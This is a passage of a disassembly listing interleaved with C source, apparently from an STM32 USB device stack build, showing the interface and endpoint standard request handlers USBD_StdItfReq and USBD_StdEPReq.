 800b6a4:	b2db      	uxtb	r3, r3
 800b6a6:	2b01      	cmp	r3, #1
 800b6a8:	d836      	bhi.n	800b718 <USBD_StdItfReq+0xac>
          {
            /* Get the class index relative to this interface */
            idx = USBD_CoreFindIF(pdev, LOBYTE(req->wIndex));
 800b6aa:	683b      	ldr	r3, [r7, #0]
 800b6ac:	889b      	ldrh	r3, [r3, #4]
 800b6ae:	b2db      	uxtb	r3, r3
 800b6b0:	4619      	mov	r1, r3
 800b6b2:	6878      	ldr	r0, [r7, #4]
 800b6b4:	f7ff fed8 	bl	800b468 <USBD_CoreFindIF>
 800b6b8:	4603      	mov	r3, r0
 800b6ba:	73bb      	strb	r3, [r7, #14]
            if (((uint8_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b6bc:	7bbb      	ldrb	r3, [r7, #14]
 800b6be:	2bff      	cmp	r3, #255	; 0xff
 800b6c0:	d01d      	beq.n	800b6fe <USBD_StdItfReq+0x92>
 800b6c2:	7bbb      	ldrb	r3, [r7, #14]
 800b6c4:	2b00      	cmp	r3, #0
 800b6c6:	d11a      	bne.n	800b6fe <USBD_StdItfReq+0x92>
            {
              /* Call the class data out function to manage the request */
              if (pdev->pClass[idx]->Setup != NULL)
 800b6c8:	7bba      	ldrb	r2, [r7, #14]
 800b6ca:	687b      	ldr	r3, [r7, #4]
 800b6cc:	32ae      	adds	r2, #174	; 0xae
 800b6ce:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b6d2:	689b      	ldr	r3, [r3, #8]
 800b6d4:	2b00      	cmp	r3, #0
 800b6d6:	d00f      	beq.n	800b6f8 <USBD_StdItfReq+0x8c>
              {
                pdev->classId = idx;
 800b6d8:	7bba      	ldrb	r2, [r7, #14]
 800b6da:	687b      	ldr	r3, [r7, #4]
 800b6dc:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
                ret = (USBD_StatusTypeDef)(pdev->pClass[idx]->Setup(pdev, req));
 800b6e0:	7bba      	ldrb	r2, [r7, #14]
 800b6e2:	687b      	ldr	r3, [r7, #4]
 800b6e4:	32ae      	adds	r2, #174	; 0xae
 800b6e6:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b6ea:	689b      	ldr	r3, [r3, #8]
 800b6ec:	6839      	ldr	r1, [r7, #0]
 800b6ee:	6878      	ldr	r0, [r7, #4]
 800b6f0:	4798      	blx	r3
 800b6f2:	4603      	mov	r3, r0
 800b6f4:	73fb      	strb	r3, [r7, #15]
              if (pdev->pClass[idx]->Setup != NULL)
 800b6f6:	e004      	b.n	800b702 <USBD_StdItfReq+0x96>
              }
              else
              {
                /* should never reach this condition */
                ret = USBD_FAIL;
 800b6f8:	2303      	movs	r3, #3
 800b6fa:	73fb      	strb	r3, [r7, #15]
              if (pdev->pClass[idx]->Setup != NULL)
 800b6fc:	e001      	b.n	800b702 <USBD_StdItfReq+0x96>
              }
            }
            else
            {
              /* No relative interface found */
              ret = USBD_FAIL;
 800b6fe:	2303      	movs	r3, #3
 800b700:	73fb      	strb	r3, [r7, #15]
            }

            if ((req->wLength == 0U) && (ret == USBD_OK))
 800b702:	683b      	ldr	r3, [r7, #0]
 800b704:	88db      	ldrh	r3, [r3, #6]
 800b706:	2b00      	cmp	r3, #0
 800b708:	d110      	bne.n	800b72c <USBD_StdItfReq+0xc0>
 800b70a:	7bfb      	ldrb	r3, [r7, #15]
 800b70c:	2b00      	cmp	r3, #0
 800b70e:	d10d      	bne.n	800b72c <USBD_StdItfReq+0xc0>
            {
              (void)USBD_CtlSendStatus(pdev);
 800b710:	6878      	ldr	r0, [r7, #4]
 800b712:	f000 fdf1 	bl	800c2f8 <USBD_CtlSendStatus>
          }
          else
          {
            USBD_CtlError(pdev, req);
          }
          break;
 800b716:	e009      	b.n	800b72c <USBD_StdItfReq+0xc0>
            USBD_CtlError(pdev, req);
 800b718:	6839      	ldr	r1, [r7, #0]
 800b71a:	6878      	ldr	r0, [r7, #4]
 800b71c:	f000 fd21 	bl	800c162 <USBD_CtlError>
          break;
 800b720:	e004      	b.n	800b72c <USBD_StdItfReq+0xc0>

        default:
          USBD_CtlError(pdev, req);
 800b722:	6839      	ldr	r1, [r7, #0]
 800b724:	6878      	ldr	r0, [r7, #4]
 800b726:	f000 fd1c 	bl	800c162 <USBD_CtlError>
          break;
 800b72a:	e000      	b.n	800b72e <USBD_StdItfReq+0xc2>
          break;
 800b72c:	bf00      	nop
      }
      break;
 800b72e:	e004      	b.n	800b73a <USBD_StdItfReq+0xce>

    default:
      USBD_CtlError(pdev, req);
 800b730:	6839      	ldr	r1, [r7, #0]
 800b732:	6878      	ldr	r0, [r7, #4]
 800b734:	f000 fd15 	bl	800c162 <USBD_CtlError>
      break;
 800b738:	bf00      	nop
  }

  return ret;
 800b73a:	7bfb      	ldrb	r3, [r7, #15]
}
 800b73c:	4618      	mov	r0, r3
 800b73e:	3710      	adds	r7, #16
 800b740:	46bd      	mov	sp, r7
 800b742:	bd80      	pop	{r7, pc}

0800b744 <USBD_StdEPReq>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
USBD_StatusTypeDef USBD_StdEPReq(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800b744:	b580      	push	{r7, lr}
 800b746:	b084      	sub	sp, #16
 800b748:	af00      	add	r7, sp, #0
 800b74a:	6078      	str	r0, [r7, #4]
 800b74c:	6039      	str	r1, [r7, #0]
  USBD_EndpointTypeDef *pep;
  uint8_t ep_addr;
  uint8_t idx;
  USBD_StatusTypeDef ret = USBD_OK;
 800b74e:	2300      	movs	r3, #0
 800b750:	73fb      	strb	r3, [r7, #15]

  ep_addr = LOBYTE(req->wIndex);
 800b752:	683b      	ldr	r3, [r7, #0]
 800b754:	889b      	ldrh	r3, [r3, #4]
 800b756:	73bb      	strb	r3, [r7, #14]

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 800b758:	683b      	ldr	r3, [r7, #0]
 800b75a:	781b      	ldrb	r3, [r3, #0]
 800b75c:	f003 0360 	and.w	r3, r3, #96	; 0x60
 800b760:	2b40      	cmp	r3, #64	; 0x40
 800b762:	d007      	beq.n	800b774 <USBD_StdEPReq+0x30>
 800b764:	2b40      	cmp	r3, #64	; 0x40
 800b766:	f200 817f 	bhi.w	800ba68 <USBD_StdEPReq+0x324>
 800b76a:	2b00      	cmp	r3, #0
 800b76c:	d02a      	beq.n	800b7c4 <USBD_StdEPReq+0x80>
 800b76e:	2b20      	cmp	r3, #32
 800b770:	f040 817a 	bne.w	800ba68 <USBD_StdEPReq+0x324>
  {
    case USB_REQ_TYPE_CLASS:
    case USB_REQ_TYPE_VENDOR:
      /* Get the class index relative to this endpoint */
      idx = USBD_CoreFindEP(pdev, ep_addr);
 800b774:	7bbb      	ldrb	r3, [r7, #14]
 800b776:	4619      	mov	r1, r3
 800b778:	6878      	ldr	r0, [r7, #4]
 800b77a:	f7ff fe82 	bl	800b482 <USBD_CoreFindEP>
 800b77e:	4603      	mov	r3, r0
 800b780:	737b      	strb	r3, [r7, #13]
      if (((uint8_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b782:	7b7b      	ldrb	r3, [r7, #13]
 800b784:	2bff      	cmp	r3, #255	; 0xff
 800b786:	f000 8174 	beq.w	800ba72 <USBD_StdEPReq+0x32e>
 800b78a:	7b7b      	ldrb	r3, [r7, #13]
 800b78c:	2b00      	cmp	r3, #0
 800b78e:	f040 8170 	bne.w	800ba72 <USBD_StdEPReq+0x32e>
      {
        pdev->classId = idx;
 800b792:	7b7a      	ldrb	r2, [r7, #13]
 800b794:	687b      	ldr	r3, [r7, #4]
 800b796:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
        /* Call the class data out function to manage the request */
        if (pdev->pClass[idx]->Setup != NULL)
 800b79a:	7b7a      	ldrb	r2, [r7, #13]
 800b79c:	687b      	ldr	r3, [r7, #4]
 800b79e:	32ae      	adds	r2, #174	; 0xae
 800b7a0:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b7a4:	689b      	ldr	r3, [r3, #8]
 800b7a6:	2b00      	cmp	r3, #0
 800b7a8:	f000 8163 	beq.w	800ba72 <USBD_StdEPReq+0x32e>
        {
          ret = (USBD_StatusTypeDef)pdev->pClass[idx]->Setup(pdev, req);
 800b7ac:	7b7a      	ldrb	r2, [r7, #13]
 800b7ae:	687b      	ldr	r3, [r7, #4]
 800b7b0:	32ae      	adds	r2, #174	; 0xae
 800b7b2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b7b6:	689b      	ldr	r3, [r3, #8]
 800b7b8:	6839      	ldr	r1, [r7, #0]
 800b7ba:	6878      	ldr	r0, [r7, #4]
 800b7bc:	4798      	blx	r3
 800b7be:	4603      	mov	r3, r0
 800b7c0:	73fb      	strb	r3, [r7, #15]
        }
      }
      break;
 800b7c2:	e156      	b.n	800ba72 <USBD_StdEPReq+0x32e>

    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 800b7c4:	683b      	ldr	r3, [r7, #0]
 800b7c6:	785b      	ldrb	r3, [r3, #1]
 800b7c8:	2b03      	cmp	r3, #3
 800b7ca:	d008      	beq.n	800b7de <USBD_StdEPReq+0x9a>
 800b7cc:	2b03      	cmp	r3, #3
 800b7ce:	f300 8145 	bgt.w	800ba5c <USBD_StdEPReq+0x318>
 800b7d2:	2b00      	cmp	r3, #0
 800b7d4:	f000 809b 	beq.w	800b90e <USBD_StdEPReq+0x1ca>
 800b7d8:	2b01      	cmp	r3, #1
 800b7da:	d03c      	beq.n	800b856 <USBD_StdEPReq+0x112>
 800b7dc:	e13e      	b.n	800ba5c <USBD_StdEPReq+0x318>
      {
        case USB_REQ_SET_FEATURE:
          switch (pdev->dev_state)
 800b7de:	687b      	ldr	r3, [r7, #4]
 800b7e0:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b7e4:	b2db      	uxtb	r3, r3
 800b7e6:	2b02      	cmp	r3, #2
 800b7e8:	d002      	beq.n	800b7f0 <USBD_StdEPReq+0xac>
 800b7ea:	2b03      	cmp	r3, #3
 800b7ec:	d016      	beq.n	800b81c <USBD_StdEPReq+0xd8>
 800b7ee:	e02c      	b.n	800b84a <USBD_StdEPReq+0x106>
          {
            case USBD_STATE_ADDRESSED:
              if ((ep_addr != 0x00U) && (ep_addr != 0x80U))
 800b7f0:	7bbb      	ldrb	r3, [r7, #14]
 800b7f2:	2b00      	cmp	r3, #0
 800b7f4:	d00d      	beq.n	800b812 <USBD_StdEPReq+0xce>
 800b7f6:	7bbb      	ldrb	r3, [r7, #14]
 800b7f8:	2b80      	cmp	r3, #128	; 0x80
 800b7fa:	d00a      	beq.n	800b812 <USBD_StdEPReq+0xce>
              {
                (void)USBD_LL_StallEP(pdev, ep_addr);
 800b7fc:	7bbb      	ldrb	r3, [r7, #14]
 800b7fe:	4619      	mov	r1, r3
 800b800:	6878      	ldr	r0, [r7, #4]
 800b802:	f001 fa21 	bl	800cc48 <USBD_LL_StallEP>
                (void)USBD_LL_StallEP(pdev, 0x80U);
 800b806:	2180      	movs	r1, #128	; 0x80
 800b808:	6878      	ldr	r0, [r7, #4]
 800b80a:	f001 fa1d 	bl	800cc48 <USBD_LL_StallEP>
 800b80e:	bf00      	nop
              }
              else
              {
                USBD_CtlError(pdev, req);
              }
              break;
 800b810:	e020      	b.n	800b854 <USBD_StdEPReq+0x110>
                USBD_CtlError(pdev, req);
 800b812:	6839      	ldr	r1, [r7, #0]
 800b814:	6878      	ldr	r0, [r7, #4]
 800b816:	f000 fca4 	bl	800c162 <USBD_CtlError>
              break;
 800b81a:	e01b      	b.n	800b854 <USBD_StdEPReq+0x110>

            case USBD_STATE_CONFIGURED:
              if (req->wValue == USB_FEATURE_EP_HALT)
 800b81c:	683b      	ldr	r3, [r7, #0]
 800b81e:	885b      	ldrh	r3, [r3, #2]
 800b820:	2b00      	cmp	r3, #0
 800b822:	d10e      	bne.n	800b842 <USBD_StdEPReq+0xfe>
              {
                if ((ep_addr != 0x00U) && (ep_addr != 0x80U) && (req->wLength == 0x00U))
 800b824:	7bbb      	ldrb	r3, [r7, #14]
 800b826:	2b00      	cmp	r3, #0
 800b828:	d00b      	beq.n	800b842 <USBD_StdEPReq+0xfe>
 800b82a:	7bbb      	ldrb	r3, [r7, #14]
 800b82c:	2b80      	cmp	r3, #128	; 0x80
 800b82e:	d008      	beq.n	800b842 <USBD_StdEPReq+0xfe>
 800b830:	683b      	ldr	r3, [r7, #0]
 800b832:	88db      	ldrh	r3, [r3, #6]
 800b834:	2b00      	cmp	r3, #0
 800b836:	d104      	bne.n	800b842 <USBD_StdEPReq+0xfe>
                {
                  (void)USBD_LL_StallEP(pdev, ep_addr);
 800b838:	7bbb      	ldrb	r3, [r7, #14]
 800b83a:	4619      	mov	r1, r3
 800b83c:	6878      	ldr	r0, [r7, #4]
 800b83e:	f001 fa03 	bl	800cc48 <USBD_LL_StallEP>
                }
              }
              (void)USBD_CtlSendStatus(pdev);
 800b842:	6878      	ldr	r0, [r7, #4]
 800b844:	f000 fd58 	bl	800c2f8 <USBD_CtlSendStatus>

              break;
 800b848:	e004      	b.n	800b854 <USBD_StdEPReq+0x110>

            default:
              USBD_CtlError(pdev, req);
 800b84a:	6839      	ldr	r1, [r7, #0]
 800b84c:	6878      	ldr	r0, [r7, #4]
 800b84e:	f000 fc88 	bl	800c162 <USBD_CtlError>
              break;
 800b852:	bf00      	nop
          }
          break;
 800b854:	e107      	b.n	800ba66 <USBD_StdEPReq+0x322>

        case USB_REQ_CLEAR_FEATURE:

          switch (pdev->dev_state)
 800b856:	687b      	ldr	r3, [r7, #4]
 800b858:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b85c:	b2db      	uxtb	r3, r3
 800b85e:	2b02      	cmp	r3, #2
 800b860:	d002      	beq.n	800b868 <USBD_StdEPReq+0x124>
 800b862:	2b03      	cmp	r3, #3
 800b864:	d016      	beq.n	800b894 <USBD_StdEPReq+0x150>
 800b866:	e04b      	b.n	800b900 <USBD_StdEPReq+0x1bc>
          {
            case USBD_STATE_ADDRESSED:
              if ((ep_addr != 0x00U) && (ep_addr != 0x80U))
 800b868:	7bbb      	ldrb	r3, [r7, #14]
 800b86a:	2b00      	cmp	r3, #0
 800b86c:	d00d      	beq.n	800b88a <USBD_StdEPReq+0x146>
 800b86e:	7bbb      	ldrb	r3, [r7, #14]
 800b870:	2b80      	cmp	r3, #128	; 0x80
 800b872:	d00a      	beq.n	800b88a <USBD_StdEPReq+0x146>
              {
                (void)USBD_LL_StallEP(pdev, ep_addr);
 800b874:	7bbb      	ldrb	r3, [r7, #14]
 800b876:	4619      	mov	r1, r3
 800b878:	6878      	ldr	r0, [r7, #4]
 800b87a:	f001 f9e5 	bl	800cc48 <USBD_LL_StallEP>
                (void)USBD_LL_StallEP(pdev, 0x80U);
 800b87e:	2180      	movs	r1, #128	; 0x80
 800b880:	6878      	ldr	r0, [r7, #4]
 800b882:	f001 f9e1 	bl	800cc48 <USBD_LL_StallEP>
 800b886:	bf00      	nop
              }
              else
              {
                USBD_CtlError(pdev, req);
              }
              break;
 800b888:	e040      	b.n	800b90c <USBD_StdEPReq+0x1c8>
                USBD_CtlError(pdev, req);
 800b88a:	6839      	ldr	r1, [r7, #0]
 800b88c:	6878      	ldr	r0, [r7, #4]
 800b88e:	f000 fc68 	bl	800c162 <USBD_CtlError>
              break;
 800b892:	e03b      	b.n	800b90c <USBD_StdEPReq+0x1c8>

            case USBD_STATE_CONFIGURED:
              if (req->wValue == USB_FEATURE_EP_HALT)
 800b894:	683b      	ldr	r3, [r7, #0]
 800b896:	885b      	ldrh	r3, [r3, #2]
 800b898:	2b00      	cmp	r3, #0
 800b89a:	d136      	bne.n	800b90a <USBD_StdEPReq+0x1c6>
              {
                if ((ep_addr & 0x7FU) != 0x00U)
 800b89c:	7bbb      	ldrb	r3, [r7, #14]
 800b89e:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800b8a2:	2b00      	cmp	r3, #0
 800b8a4:	d004      	beq.n	800b8b0 <USBD_StdEPReq+0x16c>
                {
                  (void)USBD_LL_ClearStallEP(pdev, ep_addr);
 800b8a6:	7bbb      	ldrb	r3, [r7, #14]
 800b8a8:	4619      	mov	r1, r3
 800b8aa:	6878      	ldr	r0, [r7, #4]
 800b8ac:	f001 fa02 	bl	800ccb4 <USBD_LL_ClearStallEP>
                }
                (void)USBD_CtlSendStatus(pdev);
 800b8b0:	6878      	ldr	r0, [r7, #4]
 800b8b2:	f000 fd21 	bl	800c2f8 <USBD_CtlSendStatus>

                /* Get the class index relative to this interface */
                idx = USBD_CoreFindEP(pdev, ep_addr);
 800b8b6:	7bbb      	ldrb	r3, [r7, #14]
 800b8b8:	4619      	mov	r1, r3
 800b8ba:	6878      	ldr	r0, [r7, #4]
 800b8bc:	f7ff fde1 	bl	800b482 <USBD_CoreFindEP>
 800b8c0:	4603      	mov	r3, r0
 800b8c2:	737b      	strb	r3, [r7, #13]
                if (((uint8_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b8c4:	7b7b      	ldrb	r3, [r7, #13]
 800b8c6:	2bff      	cmp	r3, #255	; 0xff
 800b8c8:	d01f      	beq.n	800b90a <USBD_StdEPReq+0x1c6>
 800b8ca:	7b7b      	ldrb	r3, [r7, #13]
 800b8cc:	2b00      	cmp	r3, #0
 800b8ce:	d11c      	bne.n	800b90a <USBD_StdEPReq+0x1c6>
                {
                  pdev->classId = idx;
 800b8d0:	7b7a      	ldrb	r2, [r7, #13]
 800b8d2:	687b      	ldr	r3, [r7, #4]
 800b8d4:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
                  /* Call the class data out function to manage the request */
                  if (pdev->pClass[idx]->Setup != NULL)
 800b8d8:	7b7a      	ldrb	r2, [r7, #13]
 800b8da:	687b      	ldr	r3, [r7, #4]
 800b8dc:	32ae      	adds	r2, #174	; 0xae
 800b8de:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b8e2:	689b      	ldr	r3, [r3, #8]
 800b8e4:	2b00      	cmp	r3, #0
 800b8e6:	d010      	beq.n	800b90a <USBD_StdEPReq+0x1c6>
                  {
                    ret = (USBD_StatusTypeDef)(pdev->pClass[idx]->Setup(pdev, req));
 800b8e8:	7b7a      	ldrb	r2, [r7, #13]
 800b8ea:	687b      	ldr	r3, [r7, #4]
 800b8ec:	32ae      	adds	r2, #174	; 0xae
 800b8ee:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b8f2:	689b      	ldr	r3, [r3, #8]
 800b8f4:	6839      	ldr	r1, [r7, #0]
 800b8f6:	6878      	ldr	r0, [r7, #4]
 800b8f8:	4798      	blx	r3
 800b8fa:	4603      	mov	r3, r0
 800b8fc:	73fb      	strb	r3, [r7, #15]
                  }
                }
              }
              break;
 800b8fe:	e004      	b.n	800b90a <USBD_StdEPReq+0x1c6>

            default:
              USBD_CtlError(pdev, req);
 800b900:	6839      	ldr	r1, [r7, #0]
 800b902:	6878      	ldr	r0, [r7, #4]
 800b904:	f000 fc2d 	bl	800c162 <USBD_CtlError>
              break;
 800b908:	e000      	b.n	800b90c <USBD_StdEPReq+0x1c8>
              break;
 800b90a:	bf00      	nop
          }
          break;
 800b90c:	e0ab      	b.n	800ba66 <USBD_StdEPReq+0x322>

        case USB_REQ_GET_STATUS:
          switch (pdev->dev_state)
 800b90e:	687b      	ldr	r3, [r7, #4]
 800b910:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b914:	b2db      	uxtb	r3, r3
 800b916:	2b02      	cmp	r3, #2
 800b918:	d002      	beq.n	800b920 <USBD_StdEPReq+0x1dc>
 800b91a:	2b03      	cmp	r3, #3
 800b91c:	d032      	beq.n	800b984 <USBD_StdEPReq+0x240>
 800b91e:	e097      	b.n	800ba50 <USBD_StdEPReq+0x30c>
          {
            case USBD_STATE_ADDRESSED:
              if ((ep_addr != 0x00U) && (ep_addr != 0x80U))
 800b920:	7bbb      	ldrb	r3, [r7, #14]
 800b922:	2b00      	cmp	r3, #0
 800b924:	d007      	beq.n	800b936 <USBD_StdEPReq+0x1f2>
 800b926:	7bbb      	ldrb	r3, [r7, #14]
 800b928:	2b80      	cmp	r3, #128	; 0x80
 800b92a:	d004      	beq.n	800b936 <USBD_StdEPReq+0x1f2>
              {
                USBD_CtlError(pdev, req);
 800b92c:	6839      	ldr	r1, [r7, #0]
 800b92e:	6878      	ldr	r0, [r7, #4]
 800b930:	f000 fc17 	bl	800c162 <USBD_CtlError>
                break;
 800b934:	e091      	b.n	800ba5a <USBD_StdEPReq+0x316>
              }
              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800b936:	f997 300e 	ldrsb.w	r3, [r7, #14]
 800b93a:	2b00      	cmp	r3, #0
 800b93c:	da0b      	bge.n	800b956 <USBD_StdEPReq+0x212>
 800b93e:	7bbb      	ldrb	r3, [r7, #14]
 800b940:	f003 027f 	and.w	r2, r3, #127	; 0x7f
 800b944:	4613      	mov	r3, r2
 800b946:	009b      	lsls	r3, r3, #2
 800b948:	4413      	add	r3, r2
 800b94a:	009b      	lsls	r3, r3, #2
 800b94c:	3310      	adds	r3, #16
 800b94e:	687a      	ldr	r2, [r7, #4]
 800b950:	4413      	add	r3, r2
 800b952:	3304      	adds	r3, #4
 800b954:	e00b      	b.n	800b96e <USBD_StdEPReq+0x22a>
                    &pdev->ep_out[ep_addr & 0x7FU];
 800b956:	7bbb      	ldrb	r3, [r7, #14]
 800b958:	f003 027f 	and.w	r2, r3, #127	; 0x7f
              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800b95c:	4613      	mov	r3, r2
 800b95e:	009b      	lsls	r3, r3, #2
 800b960:	4413      	add	r3, r2
 800b962:	009b      	lsls	r3, r3, #2
 800b964:	f503 73a8 	add.w	r3, r3, #336	; 0x150
 800b968:	687a      	ldr	r2, [r7, #4]
 800b96a:	4413      	add	r3, r2
 800b96c:	3304      	adds	r3, #4
 800b96e:	60bb      	str	r3, [r7, #8]

              pep->status = 0x0000U;
 800b970:	68bb      	ldr	r3, [r7, #8]
 800b972:	2200      	movs	r2, #0
 800b974:	601a      	str	r2, [r3, #0]

              (void)USBD_CtlSendData(pdev, (uint8_t *)&pep->status, 2U);
 800b976:	68bb      	ldr	r3, [r7, #8]
 800b978:	2202      	movs	r2, #2
 800b97a:	4619      	mov	r1, r3
 800b97c:	6878      	ldr	r0, [r7, #4]
 800b97e:	f000 fc61 	bl	800c244 <USBD_CtlSendData>
              break;
 800b982:	e06a      	b.n	800ba5a <USBD_StdEPReq+0x316>

            case USBD_STATE_CONFIGURED:
              if ((ep_addr & 0x80U) == 0x80U)
 800b984:	f997 300e 	ldrsb.w	r3, [r7, #14]
 800b988:	2b00      	cmp	r3, #0
 800b98a:	da11      	bge.n	800b9b0 <USBD_StdEPReq+0x26c>
              {
                if (pdev->ep_in[ep_addr & 0xFU].is_used == 0U)
 800b98c:	7bbb      	ldrb	r3, [r7, #14]
 800b98e:	f003 020f 	and.w	r2, r3, #15
 800b992:	6879      	ldr	r1, [r7, #4]
 800b994:	4613      	mov	r3, r2
 800b996:	009b      	lsls	r3, r3, #2
 800b998:	4413      	add	r3, r2
 800b99a:	009b      	lsls	r3, r3, #2
 800b99c:	440b      	add	r3, r1
 800b99e:	3324      	adds	r3, #36	; 0x24
 800b9a0:	881b      	ldrh	r3, [r3, #0]
 800b9a2:	2b00      	cmp	r3, #0
 800b9a4:	d117      	bne.n	800b9d6 <USBD_StdEPReq+0x292>
                {
                  USBD_CtlError(pdev, req);
 800b9a6:	6839      	ldr	r1, [r7, #0]
 800b9a8:	6878      	ldr	r0, [r7, #4]
 800b9aa:	f000 fbda 	bl	800c162 <USBD_CtlError>
                  break;
 800b9ae:	e054      	b.n	800ba5a <USBD_StdEPReq+0x316>
                }
              }
              else
              {
                if (pdev->ep_out[ep_addr & 0xFU].is_used == 0U)
 800b9b0:	7bbb      	ldrb	r3, [r7, #14]
 800b9b2:	f003 020f 	and.w	r2, r3, #15
 800b9b6:	6879      	ldr	r1, [r7, #4]
 800b9b8:	4613      	mov	r3, r2
 800b9ba:	009b      	lsls	r3, r3, #2
 800b9bc:	4413      	add	r3, r2
 800b9be:	009b      	lsls	r3, r3, #2
 800b9c0:	440b      	add	r3, r1
 800b9c2:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 800b9c6:	881b      	ldrh	r3, [r3, #0]
 800b9c8:	2b00      	cmp	r3, #0
 800b9ca:	d104      	bne.n	800b9d6 <USBD_StdEPReq+0x292>
                {
                  USBD_CtlError(pdev, req);
 800b9cc:	6839      	ldr	r1, [r7, #0]
 800b9ce:	6878      	ldr	r0, [r7, #4]
 800b9d0:	f000 fbc7 	bl	800c162 <USBD_CtlError>
                  break;
 800b9d4:	e041      	b.n	800ba5a <USBD_StdEPReq+0x316>
                }
              }

              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800b9d6:	f997 300e 	ldrsb.w	r3, [r7, #14]
 800b9da:	2b00      	cmp	r3, #0
 800b9dc:	da0b      	bge.n	800b9f6 <USBD_StdEPReq+0x2b2>
 800b9de:	7bbb      	ldrb	r3, [r7, #14]
 800b9e0:	f003 027f 	and.w	r2, r3, #127	; 0x7f
 800b9e4:	4613      	mov	r3, r2
 800b9e6:	009b      	lsls	r3, r3, #2
 800b9e8:	4413      	add	r3, r2
 800b9ea:	009b      	lsls	r3, r3, #2
 800b9ec:	3310      	adds	r3, #16
 800b9ee:	687a      	ldr	r2, [r7, #4]
 800b9f0:	4413      	add	r3, r2
 800b9f2:	3304      	adds	r3, #4
 800b9f4:	e00b      	b.n	800ba0e <USBD_StdEPReq+0x2ca>
                    &pdev->ep_out[ep_addr & 0x7FU];
 800b9f6:	7bbb      	ldrb	r3, [r7, #14]
 800b9f8:	f003 027f 	and.w	r2, r3, #127	; 0x7f
              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800b9fc:	4613      	mov	r3, r2
 800b9fe:	009b      	lsls	r3, r3, #2
 800ba00:	4413      	add	r3, r2
 800ba02:	009b      	lsls	r3, r3, #2
 800ba04:	f503 73a8 	add.w	r3, r3, #336	; 0x150
 800ba08:	687a      	ldr	r2, [r7, #4]
 800ba0a:	4413      	add	r3, r2
 800ba0c:	3304      	adds	r3, #4
 800ba0e:	60bb      	str	r3, [r7, #8]

              if ((ep_addr == 0x00U) || (ep_addr == 0x80U))
 800ba10:	7bbb      	ldrb	r3, [r7, #14]
 800ba12:	2b00      	cmp	r3, #0
 800ba14:	d002      	beq.n	800ba1c <USBD_StdEPReq+0x2d8>
 800ba16:	7bbb      	ldrb	r3, [r7, #14]
 800ba18:	2b80      	cmp	r3, #128	; 0x80
 800ba1a:	d103      	bne.n	800ba24 <USBD_StdEPReq+0x2e0>
              {
                pep->status = 0x0000U;
 800ba1c:	68bb      	ldr	r3, [r7, #8]
 800ba1e:	2200      	movs	r2, #0
 800ba20:	601a      	str	r2, [r3, #0]
 800ba22:	e00e      	b.n	800ba42 <USBD_StdEPReq+0x2fe>
              }
              else if (USBD_LL_IsStallEP(pdev, ep_addr) != 0U)
 800ba24:	7bbb      	ldrb	r3, [r7, #14]
 800ba26:	4619      	mov	r1, r3
 800ba28:	6878      	ldr	r0, [r7, #4]
 800ba2a:	f001 f979 	bl	800cd20 <USBD_LL_IsStallEP>
 800ba2e:	4603      	mov	r3, r0
 800ba30:	2b00      	cmp	r3, #0
 800ba32:	d003      	beq.n	800ba3c <USBD_StdEPReq+0x2f8>
              {
                pep->status = 0x0001U;
 800ba34:	68bb      	ldr	r3, [r7, #8]
 800ba36:	2201      	movs	r2, #1
 800ba38:	601a      	str	r2, [r3, #0]
 800ba3a:	e002      	b.n	800ba42 <USBD_StdEPReq+0x2fe>
              }
              else
              {
                pep->status = 0x0000U;
 800ba3c:	68bb      	ldr	r3, [r7, #8]
 800ba3e:	2200      	movs	r2, #0
 800ba40:	601a      	str	r2, [r3, #0]
              }

              (void)USBD_CtlSendData(pdev, (uint8_t *)&pep->status, 2U);
 800ba42:	68bb      	ldr	r3, [r7, #8]
 800ba44:	2202      	movs	r2, #2
 800ba46:	4619      	mov	r1, r3
 800ba48:	6878      	ldr	r0, [r7, #4]
 800ba4a:	f000 fbfb 	bl	800c244 <USBD_CtlSendData>
              break;
 800ba4e:	e004      	b.n	800ba5a <USBD_StdEPReq+0x316>

            default:
              USBD_CtlError(pdev, req);
 800ba50:	6839      	ldr	r1, [r7, #0]
 800ba52:	6878      	ldr	r0, [r7, #4]
 800ba54:	f000 fb85 	bl	800c162 <USBD_CtlError>
              break;
 800ba58:	bf00      	nop
          }
          break;
 800ba5a:	e004      	b.n	800ba66 <USBD_StdEPReq+0x322>

        default:
          USBD_CtlError(pdev, req);
 800ba5c:	6839      	ldr	r1, [r7, #0]
 800ba5e:	6878      	ldr	r0, [r7, #4]
 800ba60:	f000 fb7f 	bl	800c162 <USBD_CtlError>
          break;
 800ba64:	bf00      	nop
      }
      break;
 800ba66:	e005      	b.n	800ba74 <USBD_StdEPReq+0x330>

    default:
      USBD_CtlError(pdev, req);
 800ba68:	6839      	ldr	r1, [r7, #0]
 800ba6a:	6878      	ldr	r0, [r7, #4]
 800ba6c:	f000 fb79 	bl	800c162 <USBD_CtlError>
      break;
 800ba70:	e000      	b.n	800ba74 <USBD_StdEPReq+0x330>
      break;
 800ba72:	bf00      	nop
  }

  return ret;
